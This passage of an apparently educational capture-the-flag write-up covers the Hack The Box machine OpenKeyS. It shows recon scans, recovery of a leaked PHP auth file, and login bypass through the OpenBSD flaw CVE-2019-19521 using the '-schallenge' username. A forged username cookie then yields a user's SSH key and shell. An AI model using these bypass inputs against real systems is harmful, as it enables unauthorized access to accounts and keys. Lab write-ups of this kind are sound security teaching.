@@ -1,0 +1,614 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: OpenKeyS</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-openkeys">htb-openkeys</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#vim">vim</a> <a class="post-tag" href="/tags#bsd">bsd</a> <a class="post-tag" href="/tags#openbsd">openbsd</a> <a class="post-tag" href="/tags#gobuster">gobuster</a> <a class="post-tag" href="/tags#php">php</a> <a class="post-tag" href="/tags#auth-userokay">auth-userokay</a> <a class="post-tag" href="/tags#cve-2019-19521">cve-2019-19521</a> <a class="post-tag" href="/tags#cve-2019-19520">cve-2019-19520</a> <a class="post-tag" href="/tags#cve-2019-19522">cve-2019-19522</a> <a class="post-tag" href="/tags#shared-object">shared-object</a> <a class="post-tag" href="/tags#skey">skey</a> <a class="post-tag" href="/tags#cve-2020-7247">cve-2020-7247</a> <a class="post-tag" href="/tags#htb-onetwoseven">htb-onetwoseven</a> </span><br/><br/>
+<time class="dt-published" datetime="2020-12-12T14:45:00+00:00" itemprop="datePublished">Dec 12, 2020
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2020/12/12/htb-openkeys.html" style="color: #e6e6e6; text-decoration: none;">HTB: OpenKeyS</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/openkeys-cover.webp" type="image/webp"/>
+<img alt="OpenKeyS" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/openkeys-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:120px;">
+</img></picture>
+<p>OpenKeyS was all about a series of OpenBSD vulnerabilities published by Qualys in December 2019. I’ll enumerate a web page to find a vim swap file that provides some hints about how the login form is doing auth. I’ll use that to construct an attack that allows me to bypass the authentication and login as Jennifer, retrieving Jennifer’s SSH key. To root, I’ll exploit two more vulnerabilities, first to get access to the auth group using a shared library attack on xlock, and then abusing S/Key authentication. In Beyond Root, I’ll look at another OpenBSD vulnerability that was made public just after the box was released, and play with PHP and the $_REQUEST variable.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/267 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/openkeys" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">OpenKeyS</a> <a href="https://hackthebox.com/machines/openkeys" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-openkeys.webp" type="image/webp"/> <img alt="OpenKeyS" class="img-av" src="/icons/box-openkeys.png"/></picture></a><br/><a href="https://hackthebox.com/machines/openkeys" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1286321237019496451">25 Jul 2020</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">12 Dec 2020</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">OpenBSD <picture><source srcset="/icons/OpenBSD.webp" type="image/webp"/><img alt="OpenBSD" class="img-os" src="/icons/OpenBSD.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Medium">Medium [30]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/openkeys-diff.webp" type="image/webp"/><img alt="Rated difficulty for OpenKeyS" src="/img/openkeys-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/openkeys-radar.webp" type="image/webp"/><img alt="Radar chart for OpenKeyS" src="/img/openkeys-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">01:29:49</span><a href="https://app.hackthebox.com/users/13569" rel="noopener" target="_blank"><img alt="xct" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/13569" style="display: unset"/><span class="user-text" style="display: none"> xct</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">01:29:37</span><a href="https://app.hackthebox.com/users/13569" rel="noopener" target="_blank"><img alt="xct" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/13569" style="display: unset"/><span class="user-text" style="display: none"> xct</span></a><br/></td>
+</tr>
+<tr>
+<td>Creators</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/159204" rel="noopener" target="_blank"><img alt="polarbearer" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/159204" style="display: unset"/><span class="user-text" style="display: none"> polarbearer</span></a><br/> <a href="https://app.hackthebox.com/users/125033" rel="noopener" target="_blank"><img alt="GibParadox" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/125033" style="display: unset"/><span class="user-text" style="display: none"> GibParadox</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> found two open TCP ports, SSH (22) and HTTP (80):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.10.199
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 12:44 EDT
+Warning: 10.10.10.199 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.10.10.199
+Host is up (0.017s latency).
+Not shown: 62350 filtered ports, 3183 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 71.31 seconds
+
+</span><span class="gp">root@kali#</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,80 <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.10.199
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-26 12:48 EDT
+Nmap scan report for 10.10.10.199
+Host is up (0.015s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 5e:ff:81:e9:1f:9b:f8:9a:25:df:5d:82:1a:dd:7a:81 (RSA)
+|   256 64:7a:5a:52:85:c5:6d:d5:4a:6b:a7:1a:9a:8a:b9:bb (ECDSA)
+|_  256 12:35:4b:6e:23:09:dc:ea:00:8c:72:20:c7:50:32:f3 (ED25519)
+80/tcp open  http    OpenBSD httpd
+|_http-title: Site doesn't have a title (text/html).
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.21 seconds
+</span></code></pre></div></div>
+<p>The HTTP server reports this is OpenBSD (which matches what HTB displays).</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>Visiting the web root returns a HTTP 200 that redirects to <code class="language-plaintext highlighter-rouge">index.php</code>:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">96</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Sun, 26 Jul 2020 16:51:30 GMT</span>
+<span class="na">Last-Modified</span><span class="p">:</span> <span class="s">Tue, 23 Jun 2020 08:18:15 GMT</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">OpenBSD httpd</span>
+
+<span class="nt">&lt;html&gt;</span>
+  <span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"refresh"</span> <span class="na">content=</span><span class="s">"0; url=index.php"</span> <span class="nt">/&gt;</span>
+  <span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">/index.php</code> presents a login page:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200726125111255.webp" type="image/webp"/>
+<img alt="image-20200726125111255" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200726125111255.png"/>
+</picture>
+<p>The title of the page is also interesting: “OpenKeyS - Retrieve your OpenSSH Keys”. The “Forgot?” link doesn’t go anywhere.</p>
+<p>Logging in sends a POST request to <code class="language-plaintext highlighter-rouge">index.php</code> with data <code class="language-plaintext highlighter-rouge">username=0xdf&amp;password=0xdf</code>. When the creds are bad, the response provides the same page with a red message at the top of the page:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200726125521655.webp" type="image/webp"/>
+<img alt="image-20200726125521655" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200726125521655.png"/>
+</picture>
+<p>Some basic SQL checks with <code class="language-plaintext highlighter-rouge">'</code> and <code class="language-plaintext highlighter-rouge">"</code> in either field didn’t result in anything.</p>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">gobuster</code> against the site, and include <code class="language-plaintext highlighter-rouge">-x php</code> since I know the site is PHP:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.199 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-x</span> php <span class="nt">-t</span> 40 <span class="nt">-o</span> scans/gobuster-root-med-php
+<span class="go">===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.199
+[+] Threads:        40
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php
+[+] Timeout:        10s
+===============================================================
+2020/07/26 12:56:49 Starting gobuster
+===============================================================
+/index.php (Status: 200)
+/images (Status: 301)
+/css (Status: 301)
+/includes (Status: 301)
+/js (Status: 301)
+/vendor (Status: 301)
+/fonts (Status: 301)
+===============================================================
+2020/07/26 13:01:33 Finished
+===============================================================
+</span></code></pre></div></div>
+<h4 id="directories">Directories</h4>
+<p>I don’t typically show peaking into the directories like the ones above because the are typically not interesting. However, here, directory listing is enabled, which is nice, and it shows an interesting file in <code class="language-plaintext highlighter-rouge">/includes</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200726132205821.webp" type="image/webp"/>
+<img alt="image-20200726132205821" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200726132205821.png"/>
+</picture>
+<p>Clicking on <code class="language-plaintext highlighter-rouge">auth.php</code> will just show a blank page (because the server is running the PHP), but the <code class="language-plaintext highlighter-rouge">.swp</code> file is something I recognize as a <code class="language-plaintext highlighter-rouge">vim</code> swap file, which stores information about files open in the editor. I worked with a similar file in <a href="/2019/08/31/htb-onetwoseven.html#sftp-symlinks">OneTwoSeven</a>.  I’ll download the file with <code class="language-plaintext highlighter-rouge">wget</code>, and then open it with <code class="language-plaintext highlighter-rouge">vim -r auth.php.swp</code>:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200726132902558.webp" type="image/webp"/>
+<img alt="image-20200726132902558" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200726132902558.png"/>
+</picture>
+<p>It fully recovers, and provides the full path to <code class="language-plaintext highlighter-rouge">auth.php</code> on OpenKeyS, <code class="language-plaintext highlighter-rouge">/var/www/htdocs/includes/auth.php</code>. On hitting enter, I get the full file:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="k">function</span> <span class="n">authenticate</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">escapeshellcmd</span><span class="p">(</span><span class="s2">"../auth_helpers/check_auth "</span> <span class="mf">.</span> <span class="nv">$username</span> <span class="mf">.</span> <span class="s2">" "</span> <span class="mf">.</span> <span class="nv">$password</span><span class="p">);</span>
+    <span class="nb">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span> <span class="nv">$retcode</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nv">$retcode</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">is_active_session</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="c1">// Session timeout in seconds</span>
+    <span class="nv">$session_timeout</span> <span class="o">=</span> <span class="mi">300</span><span class="p">;</span>
+
+    <span class="c1">// Start the session</span>
+    <span class="nb">session_start</span><span class="p">();</span>
+
+    <span class="c1">// Is the user logged in? </span>
+    <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"logged_in"</span><span class="p">]))</span>
+    <span class="p">{</span>
+        <span class="c1">// Has the session expired?</span>
+        <span class="nv">$time</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_TIME'</span><span class="p">];</span>
+        <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'last_activity'</span><span class="p">])</span> <span class="o">&amp;&amp;</span>
+            <span class="p">(</span><span class="nv">$time</span> <span class="o">-</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'last_activity'</span><span class="p">])</span> <span class="o">&gt;</span> <span class="nv">$session_timeout</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="nf">close_session</span><span class="p">();</span>
+            <span class="k">return</span> <span class="kc">False</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">else</span>
+        <span class="p">{</span>
+            <span class="c1">// Session is active, update last activity time and return True</span>
+            <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'last_activity'</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$time</span><span class="p">;</span>
+            <span class="k">return</span> <span class="kc">True</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="k">return</span> <span class="kc">False</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">init_session</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"logged_in"</span><span class="p">]</span> <span class="o">=</span> <span class="kc">True</span><span class="p">;</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"login_time"</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_TIME'</span><span class="p">];</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"last_activity"</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_TIME'</span><span class="p">];</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"remote_addr"</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">];</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"user_agent"</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_USER_AGENT'</span><span class="p">];</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">close_session</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="nb">session_unset</span><span class="p">();</span>
+    <span class="nb">session_destroy</span><span class="p">();</span>
+    <span class="nb">session_start</span><span class="p">();</span>
+<span class="p">}</span>
+
+
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+<p>There’s one other thing I can get our of this swap file. If I look at it on it’s own (not by recovering it), I can see a username, jennifer:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200727122200762.webp" type="image/webp"/>
+<img alt="image-20200727122200762" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200727122200762.png"/>
+</picture>
+<h2 id="shell-as-jennifer">Shell as jennifer</h2>
+<h3 id="site-login">Site Login</h3>
+<h4 id="not-command-injection">Not Command Injection</h4>
+<p>I immediately looked at the <code class="language-plaintext highlighter-rouge">authenticate()</code> function in the PHP and thought about command injection:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">authenticate</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">escapeshellcmd</span><span class="p">(</span><span class="s2">"../auth_helpers/check_auth "</span> <span class="mf">.</span> <span class="nv">$username</span> <span class="mf">.</span> <span class="s2">" "</span> <span class="mf">.</span> <span class="nv">$password</span><span class="p">);</span>
+    <span class="nb">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span> <span class="nv">$retcode</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nv">$retcode</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>The problem is <code class="language-plaintext highlighter-rouge">escapeshellcmd</code>, which:</p>
+<blockquote>
+<p><strong>escapeshellarg()</strong> adds single quotes around a string and quotes/escapes any existing single quotes allowing you to pass a string directly to a shell function and having it be treated as a single safe argument. This function should be used to escape individual arguments to shell functions coming from user input. The shell functions include <a href="https://www.php.net/manual/en/function.exec.php">exec()</a>, <a href="https://www.php.net/manual/en/function.system.php">system()</a> and the <a href="https://www.php.net/manual/en/language.operators.execution.php">backtick operator</a>.</p>
+</blockquote>
+<p><a href="https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md#known-bypassesexploits">This page</a> does an awesome job of explaining how <code class="language-plaintext highlighter-rouge">escapeshellargs</code> and <code class="language-plaintext highlighter-rouge">escapeshellcmd</code> work, and what security they provide and what they don’t. Unfortunately for me here, they prevent command injection.</p>
+<h4 id="check_auth">check_auth</h4>
+<p>I visited <code class="language-plaintext highlighter-rouge">http://10.10.10.199/auth_helpers/check_auth</code>, and it downloaded a file which is an OpenBSD 64-bit ELF file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>file check_auth 
+<span class="go">check_auth: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /usr/libexec/ld.so, for OpenBSD, not stripped
+</span></code></pre></div></div>
+<p>I opened it in Ghidra, but it didn’t buy me much. However, running <code class="language-plaintext highlighter-rouge">strings</code> on the binary was very useful. One string towards the top (and then again at the bottom) was <code class="language-plaintext highlighter-rouge">auth_userokay</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>strings check_auth 
+<span class="go">/usr/libexec/ld.so
+OpenBSD  
+libc.so.95.1       
+_csu_finish
+exit                 
+_Jv_RegisterClasses
+atexit
+auth_userokay
+_end               
+AWAVAUATSH
+...[snip]...
+</span></code></pre></div></div>
+<p>Googling that string leads to the <a href="https://man.openbsd.org/authenticate.3">OpenBSD man page</a> for <code class="language-plaintext highlighter-rouge">authenticate</code>, which defines <code class="language-plaintext highlighter-rouge">auth_userokay</code> as a function that will take a username and some auth details and return 0 for failure and non-zero for success. This binary looks like some kind of wrapper that’s calling into the BSD authentication system.</p>
+<h4 id="cve-2019-19521">CVE-2019-19521</h4>
+<p>CVE-2019-19521 is an authentication-bypass vulnerability in OpenBSD’s authentication system that <a href="https://www.qualys.com/2019/12/04/cve-2019-19521/authentication-vulnerabilities-openbsd.txt">Qualys found and disclosed</a>. It found that if the username took the form of <code class="language-plaintext highlighter-rouge">-option</code>, that the authentication programs would behave in strange ways. One specific strange way was that if the username was <code class="language-plaintext highlighter-rouge">-schallenge</code>, it would return successful.</p>
+<p>That happens to work here. I’ll enter <code class="language-plaintext highlighter-rouge">-schallenge</code> as the username and <code class="language-plaintext highlighter-rouge">0xdf</code> as the password, and login:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200727125645763.webp" type="image/webp"/>
+<img alt="image-20200727125645763" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200727125645763.png"/>
+</picture>
+<p>I’ve got login bypass.</p>
+<h3 id="login-as-jennifer">Login as Jennifer</h3>
+<h4 id="php-analysis">PHP Analysis</h4>
+<p>The problem with the auth bypass above is that the username has to be a fixed string, and being in as that user doesn’t seem too useful. It turns out there’s a small bug in how the the sessions are handled that allows me to log in as one user and set my username to any other user.</p>
+<p>There are four functions defined in <code class="language-plaintext highlighter-rouge">auth_helpers.php</code>: <code class="language-plaintext highlighter-rouge">authenticate</code>, <code class="language-plaintext highlighter-rouge">is_active_session</code>, <code class="language-plaintext highlighter-rouge">init_session</code>, and <code class="language-plaintext highlighter-rouge">close_session</code>. I know that logging in submits a POST to <code class="language-plaintext highlighter-rouge">index.php</code>, which likely includes <code class="language-plaintext highlighter-rouge">auth.php</code>. Just looking at the functions from <code class="language-plaintext highlighter-rouge">auth.php</code>, I can guess roughly what the structure that handles the POST request in <code class="language-plaintext highlighter-rouge">index.php</code> looks like (in pseudo-code, not PHP) using all four functions:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="n">request</span> <span class="n">is</span> <span class="n">a</span> <span class="no">POST</span><span class="o">:</span>
+    <span class="k">if</span> <span class="nf">is_active_session</span><span class="p">()</span><span class="o">:</span>
+        <span class="nf">close_session</span><span class="p">()</span>
+    <span class="k">if</span> <span class="nf">authenticate</span><span class="p">(</span><span class="nv">$POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">])</span><span class="o">:</span>
+        <span class="nf">init_session</span><span class="p">()</span>
+        <span class="k">return</span> <span class="n">redirect</span> <span class="n">to</span> <span class="n">some</span> <span class="n">other</span> <span class="n">page</span>
+    <span class="k">else</span><span class="o">:</span>
+        <span class="k">echo</span> <span class="s2">"Authentication denied."</span>
+</code></pre></div></div>
+<p>I’ve already figured out how to get <code class="language-plaintext highlighter-rouge">authenticate</code> to return true. I’ll take another look at <code class="language-plaintext highlighter-rouge">init_session()</code>:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="n">init_session</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"logged_in"</span><span class="p">]</span> <span class="o">=</span> <span class="kc">True</span><span class="p">;</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"login_time"</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_TIME'</span><span class="p">];</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"last_activity"</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REQUEST_TIME'</span><span class="p">];</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"remote_addr"</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">];</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"user_agent"</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_USER_AGENT'</span><span class="p">];</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"username"</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">];</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">$_SESSION</code> is a variable that PHP keeps for you that is associated with a given session cookie. I want to get it set to a different username than the one I POST.</p>
+<h4 id="_request">$_REQUEST</h4>
+<p>I learned something new about PHP doing this box. I’ve used <code class="language-plaintext highlighter-rouge">$_REQUEST</code> before with a webshell so that it will work with either a GET or a POST request. The PHP docs for <code class="language-plaintext highlighter-rouge">$_REQUEST</code> show that it is actually:</p>
+<blockquote>
+<p>An associative <a href="https://www.php.net/manual/en/language.types.array.php">array</a> that by default contains the contents of <a href="https://www.php.net/manual/en/reserved.variables.get.php">$_GET</a>, <a href="https://www.php.net/manual/en/reserved.variables.post.php">$_POST</a> and <a href="https://www.php.net/manual/en/reserved.variables.cookies.php">$_COOKIE</a>.</p>
+</blockquote>
+<p>I had no idea that cookies were also checked in <code class="language-plaintext highlighter-rouge">$_REQUEST</code> (by default, checking <code class="language-plaintext highlighter-rouge">$_COOKIE</code> is actually disabled). I’ll play with this in <a href="#php-_request">Beyond Root</a>.</p>
+<p>If the session is set using <code class="language-plaintext highlighter-rouge">$_REQUEST</code>, but the name passed to <code class="language-plaintext highlighter-rouge">authenticate</code> is from <code class="language-plaintext highlighter-rouge">$_POST</code>, then I can exploit this mismatch. I can’t see what is passed to <code class="language-plaintext highlighter-rouge">authenticate</code> without access to <code class="language-plaintext highlighter-rouge">index.php</code>, but it’s worth a try.</p>
+<p>I tried intercepting a login POST with Burp and adding a cookie so that the request looked like:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200727191918452.webp" type="image/webp"/>
+<img alt="image-20200727191918452" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200727191918452.png"/>
+</picture>
+<p>When I forward the request, OpenKeyS returns a 302 with a location of <code class="language-plaintext highlighter-rouge">sshkey.php</code>. Back in my browser, I’ve got a new page with jennifer’s SSH Key.</p>
+<div style="max-height: 200px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="https://0xdfimages.gitlab.io/img/image-20200727192041763.png">
+<img alt="image-20200727192041763" src="https://0xdfimages.gitlab.io/img/image-20200727192041763.png" style="clip-path: polygon(0 0, 100% 0, 100% 160px, 49% 190px, 51% 170px, 0 200px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 160px, 49% 190px, 51% 170px, 0 200px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 175px"><a href="https://0xdfimages.gitlab.io/img/image-20200727192041763.png"><i>Click for full image</i></a></div>
+</div>
+<h3 id="ssh">SSH</h3>
+<p>I can use the key to get a shell as jennifer with SSH:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/id_rsa_openkeys_jennifer jennifer@10.10.10.199
+<span class="go">Last login: Mon Jul 27 21:23:08 2020 from 10.10.14.139
+OpenBSD 6.6 (GENERIC) #353: Sat Oct 12 10:45:56 MDT 2019
+                                                                                                        
+Welcome to OpenBSD: The proactively secure Unix-like operating system.
+
+Please use the sendbug(1) utility to report bugs in the system.
+Before reporting a bug, please try to reproduce it with the latest
+version of the code.  With bug reports, please try to ensure that
+enough information to reproduce the problem is enclosed, and if a
+known fix for it exists, include that as well.
+
+</span><span class="gp">openkeys$</span><span class="w">
+</span></code></pre></div></div>
+<p>And grab <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">openkeys$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">36ab2123************************
+</span></code></pre></div></div>
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="enumeration">Enumeration</h3>
+<p>There are three more CVEs in the <a href="https://www.qualys.com/2019/12/04/cve-2019-19521/authentication-vulnerabilities-openbsd.txt">same post from Qualys</a> beyond the authentication bypass:</p>
+<ul>
+<li>Local privilege escalation via xlock [CVE-2019-19520]</li>
